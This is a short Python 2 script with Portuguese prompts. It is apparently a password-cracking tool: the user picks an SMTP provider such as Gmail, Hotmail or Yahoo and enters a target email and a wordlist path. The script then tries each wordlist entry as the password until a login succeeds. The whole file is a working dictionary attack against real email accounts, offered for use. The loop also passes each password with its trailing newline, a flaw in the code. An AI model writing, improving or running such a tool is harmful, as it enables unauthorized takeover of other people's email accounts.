import smtplib
import colorama
from colorama import Fore
colorama.init()

menu = """
\t\tEscolha o Servidor SMTP!
\t\t************************
\n
\t[1] - Gmail
\t[2] - Hotmail
\t[3] - Yahoo
\t[4] - Uol
\t[5] - Bol
\t[6] - IG
"""

def ServidoresSMTP(opt):
    global server
    global port
    if(opt == '1'):
        print("\nOpcao escolhida: Gmail")
        server = "smtp.gmail.com"
        port = 587
    if(opt == '2'):
        print("\nOpcao escolhida: Hotmail")
        server = "smtp-mail.outlook.com"
        port = 587
    if(opt == '3'):
        print("\nOpcao escolhida: Yahoo")        
        server = "smtp.mail.yahoo.com"
        port = 587
    if(opt == '4'):
        print("\nOpcao escolhida: Uol")        
        server = "smtps.uol.com.br"
        port = 587 
    if(opt == '5'):
        print("\nOpcao escolhida: Bol")        
        server = "smtps.bol.com.br"
        port = 587 
    if(opt == '6'):
        print("\nOpcao escolhida: IG")        
        server = "smtp.ig.com.br"
        port = 587     

def TestaSenha():
    s = smtplib.SMTP(server, port)
    s.ehlo()
    s.starttls()

    user = raw_input("\nDigite o email: ")
    lista = raw_input("informe o caminho da lista: ")
    
    lista = open(lista, "r")

    for senha in lista:
        try:
            s.login(user,senha)
            print(Fore.GREEN + "\t[+] Senha Crackeada! %s" %senha)
            break
        except smtplib.SMTPAuthenticationError:
            print(Fore.RED + "\t[!] Senha Incorreta: %s" %senha )

if __name__ == "__main__":
    print(menu)
    opt = raw_input("Digite uma opcao: ")
    ServidoresSMTP(opt)
    TestaSenha()
       
